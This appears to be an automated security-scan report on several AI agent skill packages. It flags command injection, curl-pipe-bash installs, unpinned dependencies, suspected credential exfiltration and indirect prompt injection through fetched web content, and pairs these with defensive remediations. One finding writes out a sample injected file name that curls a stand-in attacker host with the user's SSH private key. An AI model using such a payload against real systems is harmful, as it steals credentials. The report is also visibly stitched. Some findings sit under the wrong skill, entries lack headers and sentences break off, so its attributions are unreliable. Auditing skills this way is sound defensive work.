### parallel-web — 🟠 HIGH

- **🟠 HIGH** `LLM_COMMAND_INJECTION` — Unvalidated Shell Variable Interpolation in Bash Commands (Command Injection Risk)
  > Throughout the skill's reference files, user-supplied arguments are interpolated directly into bash commands using shell variables like $ARGUMENTS, $RUN_ID, $FILENAME, $INTERACTION_ID, and $TASKGROUP_ID without any sanitization or quoting validation. While the commands use double-quoted variables (e.g., "$ARGUMENTS"), the instructions do not enforce input validation before substitution. A malicious user could craft input containing shell metacharacters or command substitution sequences (e.g., backticks, $(), semicolons) that could lead to command injection when the agent constructs and executes these bash commands.
  > **Remediation:** Instruct the agent to sanitize user-supplied arguments before shell interpolation. Use argument arrays instead of string interpolation where possible. Validate that $RUN_ID, $TASKGROUP_ID, and $INTERACTION_ID match expected formats (e.g., alphanumeric/UUID patterns) before use. Consider using Python subprocess with argument lists rather than shell string interpolation.

- **🟠 HIGH** `LLM_DATA_EXFILTRATION` — Unauthenticated Remote Script Execution During Setup
  > The setup instructions direct the agent to execute a remote shell script via curl piped directly to bash without any integrity verification (no checksum, no signature validation). This is a classic supply chain attack vector: if the remote URL (https://parallel.ai/install.sh) is compromised, the agent will execute arbitrary malicious code on the user's machine with the user's privileges.
  > File: `SKILL.md`
  > **Remediation:** Replace the curl-pipe-bash pattern with a verified installation method. At minimum, instruct the agent to download the script first, display it to the user for review, and only execute after explicit user confirmation. Prefer the 'uv tool install' method which has package integrity verification, or provide a checksum verification step.

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — API Key Exposure Risk via Environment and .env File Handling
  > The setup instructions direct the agent to read and handle API keys from .env files and environment variables. The instructions include 'export PARALLEL_API_KEY="your-key"' and loading from .env files. While this is standard practice, the skill provides no guidance on protecting the key from being logged, echoed to stdout, or included in command output that may be captured in context. The agent is also instructed to check for the key's presence in .env files, which could inadvertently expose the key value in agent output.
  > File: `SKILL.md`
  > **Remediation:** Add explicit instructions to never display or log the API key value. Instruct the agent to verify key presence without echoing its value. Use 'parallel-cli auth' status checks that don't expose the key itself.

- **🟡 MEDIUM** `LLM_SKILL_DISCOVERY_ABUSE` — Over-Broad Capability Claims and Forced Activation in Skill Description
  > The skill description contains explicit instructions to activate this skill for ANY web-related task, even when the user does not mention 'parallel' or 'web' explicitly. The description states: 'Use this skill for ANY web-related task — even if the user doesn't mention 'parallel' or 'web' explicitly.' This is a form of capability inflation and activation priority manipulation designed to maximize the skill's invocation frequency beyond what the user explicitly requests, potentially displacing other legitimate tools or skills.
  > File: `SKILL.md`
  > **Remediation:** Narrow the description to accurately reflect the skill's specific capabilities without instructing the agent to use it for all possible web tasks. Remove the directive to activate even when the user doesn't mention the relevant keywords.

- **🟡 MEDIUM** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Package Installation Without Version Constraints
  > The setup section installs packages without pinning to specific versions: 'uv tool install "parallel-web-tools[cli]"' and 'pip install python-dotenv[cli]'. Unpinned installations are vulnerable to dependency confusion attacks and supply chain compromise, where a malicious version of the package could be published and automatically installed.
  > File: `SKILL.md`
  > **Remediation:** Pin all package installations to specific verified versions (e.g., 'uv tool install "parallel-web-tools[cli]==1.2.3"'). Include hash verification where supported. Document the expected package version in the skill manifest.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing License Information
  > The skill manifest does not specify a license, which reduces transparency about the skill's provenance and usage rights. Combined with the broad activation instructions, this makes it harder for users to assess the trustworthiness of the skill.
  > File: `SKILL.md`
  > **Remediation:** Add a license field to the YAML frontmatter specifying the applicable license (e.g., MIT, Apache-2.0, or proprietary).

- **🔵 LOW** `LLM_PROMPT_INJECTION` — Indirect Prompt Injection Risk via Unvalidated Web Content Extraction
  > The web-extract capability instructs the agent to return extracted content 'verbatim' from arbitrary URLs, including academic PDFs and web pages. Malicious web pages could embed prompt injection instructions within their content that the agent would then process as part of its context. The instruction 'Keep content verbatim - do not paraphrase or summarize' and 'Preserve all facts, names, numbers, dates, quotes' increases the risk that injected instructions in fetched content would be faithfully reproduced and potentially acted upon.
  > File: `references/web-extract.md`
  > **Remediation:** Add instructions to treat all extracted web content as untrusted data, not as instructions. Instruct the agent to wrap extracted content in clear delimiters and explicitly note that content from external sources should never be interpreted as agent instructions. Consider sanitizing or flagging content that contains instruction-like patterns.

  > The SKILL.md manifest does not specify 'allowed-tools' or 'compatibility' fields. While these are optional per the agent skills spec, their absence means the agent has no declared restrictions on which tools it may use when executing this skill. Given that the skill instructs installation of packages via bash and execution of Python code, declaring these capabilities explicitly would improve security posture and allow enforcement of least-privilege principles.
  > File: `SKILL.md`
  > **Remediation:** Add 'allowed-tools: [Bash, Python]' and a 'compatibility' field to the YAML frontmatter to explicitly declare the tools this skill requires, enabling agents to enforce appropriate restrictions.

- **🔵 LOW** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Package Installation
  > The SKILL.md instructs installation of qutip and optional packages (qutip-qip, qutip-qtrl) using 'uv pip install qutip' without version pinning. Unpinned dependencies can be exploited via supply chain attacks where a malicious version of a package is published, or a future version introduces breaking changes or malicious code. This is a low-severity concern for a well-known scientific library, but best practice requires pinning versions.
  > File: `SKILL.md`
  > **Remediation:** Pin package versions explicitly, e.g., 'uv pip install qutip==5.0.4 qutip-qip==0.4.0'. This ensures reproducibility and protects against supply chain attacks via version substitution.

- **🔵 LOW** `LLM_COMMAND_INJECTION` — Use of eval/exec in Python Code Blocks
  > The static analyzer flagged a Python code block containing eval or exec usage within the skill's reference documentation. While these appear in educational/example code blocks within the reference markdown files (e.g., references/time_evolution.md, references/analysis.md, references/advanced.md), the agent may be instructed to execute these code examples. The use of eval/exec in agent-executed code can lead to arbitrary code execution if user-controlled input is passed to these constructs. Review of the reference files shows no direct eval/exec calls in the visible content, but the static scanner detected one. This warrants attention if the agent executes code blocks from these files.
  > File: `references/time_evolution.md`
  > **Remediation:** Identify the specific code block containing eval/exec. If it is purely educational/documentation content that the agent will not execute, add a clear comment indicating it is illustrative only. If the agent may execute it, ensure no user-controlled input flows into eval/exec calls.

- **🟠 HIGH** `MDBLOCK_PYTHON_EVAL_EXEC` — Python code block uses eval/exec
  > Code block in references/visualization.md at line 197 contains potentially dangerous Python code.
  > File: `references/visualization.md:197`
  > **Remediation:** Review the code block for security implications.

### scientific-brainstorming — 🟠 HIGH

- **🟠 HIGH** `LLM_DATA_EXFILTRATION` — Static Analysis Flags Environment Variable Exfiltration and Cross-File Exfiltration Chain
  > The pre-scan static analysis reports BEHAVIOR_ENV_VAR_EXFILTRATION (environment variable access combined with network calls), BEHAVIOR_CROSSFILE_EXFILTRATION_CHAIN (cross-file exfiltration chain across 2 files), and BEHAVIOR_CROSSFILE_ENV_VAR_EXFILTRATION (cross-file environment variable exfiltration across 2 files). The file inventory indicates 3 Python files are present in the skill package, yet no script content was surfaced in the provided analysis input. This discrepancy — Python files exist but their content was not shown — combined with the static analysis flags strongly suggests hidden Python scripts that read environment variables (potentially credentials, API keys, or tokens) and transmit them to external endpoints. The skill's stated purpose (scientific brainstorming, a purely conversational task) has no legitimate need for environment variable access or network calls.
  > File: `SKILL.md`
  > **Remediation:** 1. Immediately inspect all 3 Python files in the skill package for environment variable reads (os.environ, os.getenv) and network calls (requests, urllib, http.client, socket, etc.). 2. Remove any code that reads credentials or sensitive environment variables. 3. Remove any outbound network calls not explicitly required by the skill's stated purpose. 4. If network calls are legitimately needed, document them in the manifest and restrict to known safe endpoints. 5. Do not deploy this skill until the Python file contents have been fully audited.

- **🟡 MEDIUM** `LLM_PROMPT_INJECTION` — Missing Referenced Files May Allow Future Indirect Prompt Injection
  > The SKILL.md instructions reference 'references/brainstorming_methods.md' and also mention 'assets/brainstorming_methods.md' and 'templates/brainstorming_methods.md'. Two of these files (assets/ and templates/ variants) were not found in the package. If these files are later added or substituted by a malicious actor, they could contain injected instructions that the agent would follow during brainstorming sessions. The instruction 'Consult references/brainstorming_methods.md for additional structured techniques' creates a trust delegation to file content that could be manipulated.
  > File: `SKILL.md`
  > **Remediation:** 1. Remove references to files that do not exist in the package. 2. Ensure all referenced files are bundled with the skill and their content is reviewed before deployment. 3. Consider inlining critical instructions rather than delegating to external files to reduce the attack surface for indirect prompt injection.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing allowed-tools and compatibility metadata
  > The SKILL.md manifest does not specify 'allowed-tools' or 'compatibility' fields. While these are optional per the agent skills spec, their absence means there are no declared restrictions on which agent tools this skill may invoke. Given the pre-scan static analysis flags indicating potential environment variable access and network calls in associated Python files (not surfaced in the provided content), this omission is worth noting.
  > File: `SKILL.md`
  > **Remediation:** Add explicit 'allowed-tools' restrictions to the manifest to limit the skill to only the tools it legitimately needs (e.g., Read, Grep). This provides a declared security boundary.

### bulk-rnaseq — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_PROMPT_INJECTION` — Transitive Trust Delegation to External Pipeline (nf-core/rnaseq)
  > The skill instructs the agent to execute 'nextflow run nf-core/rnaseq -r 3.26.0' which fetches and executes pipeline code from an external source (nf-co.re / GitHub). While a revision is pinned with '-r 3.26.0', the pipeline code itself is fetched at runtime from the internet. If the nf-core repository or its dependencies were compromised, the agent would execute malicious pipeline code. The skill also delegates significant trust to the 'nextflow' skill for execution details, creating a transitive trust chain.
  > File: `SKILL.md`
  > **Remediation:** Document that users should use 'nf-core pipelines download' to cache the pipeline locally before execution, and verify the pipeline's SHA/digest. Consider adding a note about verifying the pipeline revision hash rather than relying solely on the version tag, as tags can be moved.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Missing allowed-tools Declaration
  > The SKILL.md manifest does not declare an 'allowed-tools' field. The skill executes Python scripts (build_counts_matrix.py, validate_samplesheet.py), runs Bash commands (nextflow, fastqc, fastp, STAR, Salmon, conda), and performs file I/O. Without an explicit allowed-tools declaration, there is no manifest-level constraint on what tools the agent may invoke on behalf of this skill.
  > File: `SKILL.md`
  > **Remediation:** Add an explicit 'allowed-tools' field to the YAML frontmatter listing the tools actually needed, e.g.: allowed-tools: [Read, Write, Bash, Python]. This provides a manifest-level constraint and makes the skill's intended capabilities auditable.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Over-Broad Skill Description with Keyword Baiting
  > The skill description contains an unusually large number of trigger phrases and keyword patterns designed to maximize activation: 'analyze my RNA-seq', 'FASTQ to DESeq2', 'run nf-core/rnaseq', 'STAR/Salmon quantification', 'build a counts matrix for DESeq2', 'go from reads to differentially expressed genes and enriched pathways'. While these are plausibly legitimate for a bioinformatics orchestrator skill, the density of quoted trigger phrases in the description is characteristic of keyword baiting to inflate activation frequency.
  > File: `SKILL.md`
  > **Remediation:** Reduce the description to a concise functional summary without embedding multiple quoted trigger phrases. Let the skill name and a single clear description drive activation rather than keyword stuffing.

- **🔵 LOW** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Python Dependency in Setup Instructions
  > The setup section instructs users to install 'pytximport' and 'pandas' without version pins ('uv pip install pytximport pandas'). Downstream skill dependencies (pydeseq2, gseapy, gprofiler-official) are also listed without version pins. Unpinned dependencies are vulnerable to supply chain compromise via malicious package updates or typosquatting.
  > File: `SKILL.md`
  > **Remediation:** Pin all dependencies to specific versions, e.g.: 'uv pip install pytximport==0.4.0 pandas==2.2.2'. Document the pinned versions in a requirements.txt or pyproject.toml file. The skill itself already correctly notes 'Unpinned versions' as a common pitfall but does not apply this to its own setup instructions.

- **🔵 LOW** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Conda Environment in Setup Instructions
  > The conda environment creation command pins STAR and Salmon versions but leaves fastqc, fastp, trim-galore, subread, and multiqc unpinned. Unpinned conda packages can resolve to different versions across installations, undermining reproducibility and creating supply chain risk.
  > File: `SKILL.md`
  > **Remediation:** Pin all conda packages to specific versions, e.g.: fastqc=0.12.1, fastp=0.23.4, trim-galore=0.6.10, subread=2.0.6, multiqc=1.21. Export the full environment with 'conda env export > environment.yml' for full reproducibility.

- **🟡 MEDIUM** `LLM_PROMPT_INJECTION` — User-Provided File Paths Passed to Scripts Without Validation
  > Both scripts (validate_samplesheet.py and build_counts_matrix.py) accept user-provided file paths via command-line arguments and use them directly in file operations (pd.read_csv, glob patterns, Path operations). The validate_samplesheet.py script reads FASTQ paths from the samplesheet CSV and checks their existence. A maliciously crafted samplesheet could reference sensitive files or use path traversal patterns. The build_counts_matrix.py script globs user-provided directories for quant files.
  > File: `scripts/build_counts_matrix.py`
  > **Remediation:** Validate that all user-provided paths are within expected directories (e.g., resolve paths and check they don't escape the working directory). Sanitize path inputs before use. Consider restricting glob patterns to expected file extensions only.

- **🔵 LOW** `LLM_RESOURCE_ABUSE` — Unbounded Directory Traversal in build_counts_matrix.py
  > The build_from_salmon function uses glob('*/quant.sf') on a user-provided quant_dir, and build_from_star uses glob('*ReadsPerGene.out.tab'). If the user provides a very large directory (e.g., the home directory or a network mount), this could result in scanning enormous directory trees, consuming significant I/O and memory resources. There is no depth limit or file count limit on the glob operations.
  > File: `scripts/build_counts_matrix.py`
  > **Remediation:** Add a maximum file count check after globbing (e.g., warn or abort if more than a reasonable number of files are found, such as 1000). Consider adding a --max-samples argument. Validate that quant_dir is a reasonable path before globbing.

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Static Analysis Flags Environment Variable Access with Network Calls
  > The pre-scan static analysis detected patterns consistent with environment variable access combined with network calls (BEHAVIOR_ENV_VAR_EXFILTRATION and BEHAVIOR_CROSSFILE_EXFILTRATION_CHAIN across 2 files). The skill's compatibility notes explicitly state it makes network calls to BiGG/BioModels repositories for remote model loading. While the documented network usage (load_model for remote BiGG/BioModels models) appears legitimate, the combination of environment variable access and network calls flagged across multiple files warrants scrutiny. The skill package reportedly contains 10 Python files, none of which were provided for review, making it impossible to fully verify the static analysis findings.
  > **Remediation:** The 10 Python files in the package were not provided for review. These files must be audited to verify: (1) what environment variables are being accessed, (2) what network endpoints are being called, (3) whether any environment variable values are transmitted in network requests. If environment variables (e.g., API keys, credentials, PATH) are being read and sent to external servers, this constitutes a critical data exfiltration vulnerability.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing Referenced Files May Indicate Incomplete Package
  > Several files referenced in the SKILL.md instructions and reference documents are not found in the skill package: templates/workflows.md, matplotlib.py, cobra.py, templates/api_quick_reference.md, assets/api_quick_reference.md, assets/workflows.md. While some of these (matplotlib.py, cobra.py) appear to be standard library references rather than actual bundled files, the missing template/asset files could indicate an incomplete package or references to files that should be bundled but are not present.
  > File: `SKILL.md`
  > **Remediation:** Audit all referenced files and either bundle them with the skill package or remove references to non-existent files. Verify that matplotlib.py and cobra.py are not intended as local override files that could shadow standard library imports.

- **🔵 LOW** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Dependency on External Network Resources for Model Loading
  > The skill fetches metabolic models from external repositories (BiGG, BioModels) at runtime. While the cobra package itself is pinned to version 0.31.1, the remote model data fetched from BiGG/BioModels is not versioned or integrity-checked within the skill. A compromised or modified model file from these external sources could potentially contain malicious data that influences analysis results. Additionally, the gapfilling workflow requires a user-provided universal reactions SBML file from an unspecified source.
  > File: `SKILL.md`
  > **Remediation:** Document the expected checksums or versions of remotely fetched models. Advise users to verify the integrity of externally sourced SBML files before use in gapfilling workflows. Consider caching verified model files locally within the skill package.

- **🔵 LOW** `LLM_RESOURCE_ABUSE` — Computationally Expensive Operations Without Adequate Resource Guardrails
  > Several workflows in references/workflows.md invoke computationally expensive operations (double gene deletions, loopless FVA, large flux sampling runs) that can consume significant CPU and memory resources. While the workflow file does include some warnings about performance (e.g., 'Double deletions scale poorly'), the default parameters in some examples (e.g., processes=4 for double deletions, n=1000 for sampling) could cause resource exhaustion on genome-scale models. The SKILL.md best practices section does mention starting with small n and processes=1, but this guidance is not enforced in the workflow code.
  > File: `references/workflows.md`
  > **Remediation:** Add explicit resource limits or user confirmation prompts before executing computationally expensive operations on genome-scale models. Consider adding timeout parameters or maximum iteration limits to prevent runaway computations.

### deeptools — 🟡 MEDIUM

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing allowed-tools Manifest Field
  > The skill does not declare an 'allowed-tools' field in its YAML frontmatter. While this field is optional per the agent skills spec, its absence means there are no declared restrictions on which agent tools (Read, Write, Bash, Python, etc.) this skill may invoke. Given the skill executes Python scripts and generates/runs bash scripts, declaring allowed tools would improve transparency.
  > File: `SKILL.md`
  > **Remediation:** Add an explicit 'allowed-tools' field to the YAML frontmatter, e.g., 'allowed-tools: [Bash, Python, Read, Write]', to document the intended tool usage scope.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing Compatibility Field in Manifest
  > The skill does not specify a 'compatibility' field in its YAML frontmatter. This is a minor documentation gap that reduces transparency about where the skill is intended to operate.
  > File: `SKILL.md`
  > **Remediation:** Add a 'compatibility' field to the YAML frontmatter to clarify supported environments.

- **🟡 MEDIUM** `LLM_COMMAND_INJECTION` — Unsanitized User Input Interpolated into Generated Bash Scripts
  > The workflow_generator.py script interpolates user-supplied parameters (--input-bam, --chip-bam, --chip-bams, --rnaseq-bam, --atac-bam, --genes-bed, --peaks-bed, --output-dir) directly into bash script templates via Python f-strings without any sanitization or escaping. If a user provides a maliciously crafted filename or path containing shell metacharacters (e.g., semicolons, backticks, $(), pipes), the generated bash script could execute arbitrary commands when run. For example, a value like 'file.bam; curl attacker.com/$(cat ~/.ssh/id_rsa)' would be embedded verbatim into the generated script.
  > File: `scripts/workflow_generator.py`
  > **Remediation:** Sanitize all user-supplied parameters before interpolating them into bash scripts. Validate that file paths contain only expected characters (alphanumeric, dots, underscores, hyphens, forward slashes). Use shlex.quote() for string values embedded in shell scripts. Validate numeric parameters (threads, genome_size) are actually integers before interpolation. Reject inputs containing shell metacharacters.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Pre-Scan Flags Potential Environment Variable Access with Network Calls
  > The static pre-scan flagged 'BEHAVIOR_ENV_VAR_EXFILTRATION' and 'BEHAVIOR_CROSSFILE_EXFILTRATION_CHAIN' across 2 files. However, manual review of the provided script files (workflow_generator.py and validate_files.py) does not reveal any environment variable access (os.environ) or network calls (requests, urllib, socket, etc.). The flagged behavior may be present in unreferenced or unshared script files within the 32-file package inventory, or may be a false positive from the static analyzer. The provided scripts are limited to file I/O, argument parsing, and bash script generation using only user-supplied parameters interpolated via f-strings.
  > File: `scripts/workflow_generator.py`
  > **Remediation:** Audit all 32 files in the package (particularly any Python scripts not shown in this analysis) for os.environ access combined with network calls. Ensure no script reads environment variables (API keys, credentials, tokens) and transmits them externally.

  > The scripts pass user-supplied query strings (exa_search.py) and URLs (exa_extract.py) directly to the Exa API without sanitization or validation. While this is expected for a search/extract tool, a malicious user could craft queries or URLs designed to manipulate Exa's retrieval behavior or extract content from unintended sources. The returned content from external web pages is then presented to the agent, creating an indirect prompt injection surface — fetched web content could contain adversarial instructions that the agent might follow when summarizing or presenting results.
  > File: `references/web-extract.md`

While this is the intended and documented behavior of the skill, it does mean the API key is transmitted over the network on every invocation. The static analyzer flagged this as a cross-file env var exfiltration chain. In context, this is legitimate API authentication, not malicious exfiltration — the key is sent to exa.ai (the declared service provider), not an attacker-controlled endpoint. Risk is LOW because the behavior is transparent, documented, and matches the skill's stated purpose.
  > File: `scripts/exa_search.py`
  > **Remediation:** No remediation required for normal use. Users should ensure EXA_API_KEY is scoped to minimum necessary permissions on the Exa dashboard. Consider documenting that the key is transmitted to exa.ai on every query so users are aware.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Integration Tracking Header Sent on Every Request

The SKILL.md explicitly instructs: 'Do not remove or rename this header when adapting the scripts.' While this is disclosed and appears to be legitimate usage attribution, it does mean that Exa can track all queries made through this skill, associating them with the 'k-dense-ai--scientific-agent-skills' integration identifier. Users may not be aware their queries are being attributed and tracked.
  > File: `scripts/exa_search.py:75`
  > **Remediation:** Add a disclosure in the skill documentation that all queries are attributed to the k-dense-ai integration identifier for usage tracking by Exa. Users should be informed that their search queries are associated with this identifier in Exa's analytics.

  > File: `skills/exa-search/scripts/exa_extract.py`

### hugging-science — 🟡 MEDIUM

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — HF_TOKEN Loaded from .env and Passed to External Services
  > The skill instructs the agent to load `HF_TOKEN` from a `.env` file and use it in all scripts that interact with the Hugging Face API, including calls to external Spaces, Inference Providers, and dataset downloads. While this is a standard pattern, the skill fetches content from `huggingscience.co` (a third-party domain, not huggingface.co) before making authenticated HF API calls. If the catalog content from `huggingscience.co` were to manipulate the agent into sending the token to an unintended endpoint, credential exposure could occur. The token handling itself is reasonable, but the combination with external content fetching creates a risk surface.
  > File: `SKILL.md`

The fetch_catalog.py script correctly uses only `huggingscience.co` without authentication, which is good. Maintain this separation explicitly in the instructions.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Missing License and Compatibility Metadata
  > The skill does not specify a `license` or `compatibility` field in its YAML manifest. While these are optional fields, their absence means users cannot easily assess the terms under which the skill operates or which agent environments it is designed for. The skill also lacks an `allowed-tools` declaration, making it impossible to verify that the skill's behavior (network fetching, file reading, code execution) is within declared boundaries.
  > File: `SKILL.md`
  > **Remediation:** Add `license`, `compatibility`, and `allowed-tools` fields to the YAML manifest. Given the skill fetches external URLs and executes Python code, `allowed-tools` should at minimum declare Bash and Python. This improves transparency and allows security tooling to validate behavior against declared capabilities.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Overly Broad Domain Activation Triggers
  > The skill description and SKILL.md enumerate an extremely broad list of scientific domains (biology, chemistry, physics, astronomy, climate, genomics, materials, medicine, ecology, energy, engineering, math, drug discovery, protein design, weather modeling, theorem proving, single-cell, PDE solving) as activation triggers. This covers a very large fraction of technical/scientific queries and could cause the skill to activate and fetch external content in many situations where it may not be needed, increasing the attack surface for indirect prompt injection via catalog content.
  > File: `SKILL.md`
  > **Remediation:** The broad activation scope is somewhat mitigated by the qualifier 'AI/ML work in a scientific domain', which is reasonable. However, consider tightening the description to reduce unnecessary activations. The skill already includes a note to defer to general HF Hub knowledge for generic ML tasks, which is a good practice.

- **🟡 MEDIUM** `LLM_COMMAND_INJECTION` — Static Analyzer Flag: eval/exec Usage in Python Code Block
  > The static pre-scan flagged a Python code block using eval/exec (MDBLOCK_PYTHON_EVAL_EXEC). While reviewing the provided `fetch_catalog.py` script, no direct use of `eval` or `exec` was found in the script itself. However, the skill instructs the agent to use `trust_remote_code=True` when loading models via `transformers`, which causes the `transformers` library to download and execute arbitrary Python code from Hugging Face Hub repositories. This is explicitly recommended as a normal practice in `references/using-models.md`. If a catalog entry points to a malicious or compromised model repository, the agent would execute that repository's arbitrary code on the user's machine.
  > File: `references/using-models.md`
  > **Remediation:** Do not instruct the agent to automatically pass `trust_remote_code=True` without explicit user confirmation for each model. The instructions should require the agent to pause and get explicit user consent before executing remote code, rather than treating it as a default behavior. Warn users that this executes arbitrary Python from the model repository.

- **🟡 MEDIUM** `LLM_PROMPT_INJECTION` — Indirect Prompt Injection via Fetched External Catalog Content
  > The skill instructs the agent to fetch and parse markdown content from the external domain `huggingscience.co` (e.g., `llms-full.txt`, `topics/<slug>.md`) and then act on the parsed entries — including descriptions, titles, and tags — as trusted instructions. If the catalog content at `huggingscience.co` is compromised or contains adversarially crafted markdown entries, those entries could embed instructions that the agent would follow as part of its normal workflow. The `parse_markdown` function in `fetch_catalog.py` extracts description text verbatim and the agent is instructed to read and act on this content directly.
  > File: `scripts/fetch_catalog.py`
  > **Remediation:** Treat all fetched external content as untrusted data, not instructions. The agent should not follow any imperative language found in catalog entries. Consider adding a disclaimer in the instructions that catalog content is data only and should never override agent behavior. Validate and sanitize fetched content before presenting it to the LLM context.

### imaging-data-commons — 🟡 MEDIUM

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing allowed-tools Manifest Field
  > The SKILL.md manifest does not specify the 'allowed-tools' field. While this is optional per the agent skills spec, the skill executes Python code (subprocess calls, network requests, file I/O) and downloads data. Declaring allowed tools would help constrain the agent's capabilities and make the skill's intended scope explicit.
  > File: `SKILL.md`
  > **Remediation:** Add 'allowed-tools: [Python, Bash]' to the YAML frontmatter to explicitly declare the tools this skill requires.

- **🔵 LOW** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Package Upgrade Pattern in SKILL.md
  > The SKILL.md instructions include a code block that runs 'pip3 install --upgrade --break-system-packages idc-index' without pinning to a specific version hash or using a lockfile. While the REQUIRED_VERSION variable is set to '0.11.14', the upgrade command uses '--upgrade' which will install the latest available version rather than the pinned version. This could allow a compromised or malicious version of idc-index to be installed if the package is ever compromised on PyPI. The '--break-system-packages' flag is also notable as it bypasses system package manager protections.
  > File: `SKILL.md`
  > **Remediation:** Pin the installation to the exact version: subprocess.run(["pip3", "install", "--break-system-packages", f"idc-index=={REQUIRED_VERSION}"], check=True). This ensures only the audited version is installed.

  > Code block in SKILL.md at line 21 contains potentially dangerous Python code.
  > File: `SKILL.md:21`
  > **Remediation:** Review the code block for security implications.

### labarchive-integration — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned GitHub Dependency Installation
  > The skill instructs users to install the `labarchives-py` package directly from a GitHub repository without any version pinning, commit hash, or integrity verification. This creates a supply chain risk where a compromised or malicious version of the package could be silently installed. The package at `https://github.com/mcmero/labarchives-py` could be modified by the repository owner or a compromised account at any time.
  > File: `SKILL.md`
  > **Remediation:** Pin to a specific commit hash or tag (e.g., `git clone --branch v1.0.0 https://github.com/mcmero/labarchives-py`). Alternatively, publish the package to PyPI with a pinned version and use `pip install labarchives-py==<version>`. Verify package integrity with checksums before installation.

This is a supply chain provenance concern — users cannot determine the legal terms under which the skill and its bundled code can be used, modified, or distributed. Combined with the external GitHub dependency, the overall provenance of the skill is unclear.
  > File: `SKILL.md`
  > **Remediation:** Specify a valid SPDX license identifier (e.g., MIT, Apache-2.0) in the YAML frontmatter. Ensure the license is compatible with the `labarchives-py` dependency's license.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — SSL Verification Disable Pattern in Reference Documentation
  > The `references/authentication_guide.md` includes a code example that disables SSL certificate verification (`verify=False`). While labeled as 'not recommended for production', providing this pattern in documentation normalizes insecure practices and could lead users to deploy it in production environments, enabling man-in-the-middle attacks that could intercept credentials.
  > File: `references/authentication_guide.md`
  > **Remediation:** Remove the `verify=False` example entirely, or replace it with proper guidance on configuring custom CA certificates using `verify='/path/to/ca-bundle.crt'`. Add a prominent warning that disabling SSL verification exposes credentials to interception.

- **🟡 MEDIUM** `MDBLOCK_PYTHON_HTTP_POST` — Python code block sends HTTP POST request
  > Code block in references/integrations.md at line 309 contains potentially dangerous Python code.
  > File: `references/integrations.md:309`
  > **Remediation:** Review the code block for security implications.

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Credentials Transmitted in HTTP Request Body (Plaintext in POST Data)
  > In `entry_operations.py`, the `upload_attachment` function includes `access_key_id` and `access_password` directly in the POST request body as form data fields. While HTTPS is used, embedding credentials in request bodies (rather than using Authorization headers or signed requests) increases the risk of credential exposure in server logs, proxy logs, and debugging output. The credentials are also loaded from a config file and passed through multiple function layers.
  > File: `scripts/entry_operations.py`
  > **Remediation:** Use HTTP Authorization headers instead of embedding credentials in request bodies. Consider using HMAC-signed requests or Bearer tokens. Ensure credentials are never logged or printed in error messages.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Credentials Stored in Plaintext YAML Config File
  > The `setup_config.py` script creates a `config.yaml` file containing sensitive credentials including `access_key_id`, `access_password`, `user_email`, and `user_external_password`. While the script sets file permissions to 0o600, the credentials are stored in plaintext YAML. The authentication guide also shows credentials hardcoded in R code examples. If the config file is accidentally committed to version control or accessed by another process, all credentials are exposed.
  > File: `scripts/setup_config.py`
  > **Remediation:** Prefer environment variables over config files for credential storage. If config files are used, consider encrypting them at rest using tools like `ansible-vault` or OS keychain integration. Add `config.yaml` to `.gitignore` by default in the setup script. The skill already mentions environment variables as an alternative — make this the default recommendation.

### matlab — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Static Analyzer Detected Environment Variable Exfiltration Chain Across Multiple Files
  > The pre-scan static analysis flagged three specific behavioral indicators: BEHAVIOR_ENV_VAR_EXFILTRATION (environment variable access combined with network calls), BEHAVIOR_CROSSFILE_EXFILTRATION_CHAIN (cross-file exfiltration chain spanning 3 files), and BEHAVIOR_CROSSFILE_ENV_VAR_EXFILTRATION (cross-file env var exfiltration across 3 files). The skill package contains 5 Python files that were not provided for review. These findings strongly suggest that the unreferenced Python scripts implement a pattern of reading environment variables (potentially containing API keys, credentials, or tokens) and transmitting them to external endpoints. This is a high-confidence indicator of a data exfiltration capability embedded in the skill.
  > File: `SKILL.md`
  > **Remediation:** Immediately audit all 5 Python files in the skill package. Look for os.environ, os.getenv, subprocess calls, and any network requests (requests, urllib, http.client, socket). Remove any code that reads environment variables and transmits data externally. The skill's stated purpose (MATLAB/Octave scripting assistance) does not require environment variable access or outbound network calls.

  > The bundled reference file references/python-integration.md contains an example that uses Python's requests library to make HTTP calls to external APIs, including reading response data.   > The pre-scan static analysis reports 'BEHAVIOR_EVAL_SUBPROCESS: eval/exec combined with subprocess detected' across the file inventory, which includes 2 Python files. However, no script files were provided for review in this analysis. This discrepancy suggests that Python scripts exist in the skill package but were not surfaced for inspection. The combination of eval/exec with subprocess is a high-risk pattern that can enable arbitrary code execution or command injection if user-controlled input reaches these constructs.
  > File: `SKILL.md`
  > **Remediation:** Provide the 2 Python files for full security review. Audit all uses of eval(), exec(), and subprocess calls to ensure no user-controlled input reaches these constructs without sanitization. Replace eval/exec patterns with safer alternatives where possible.

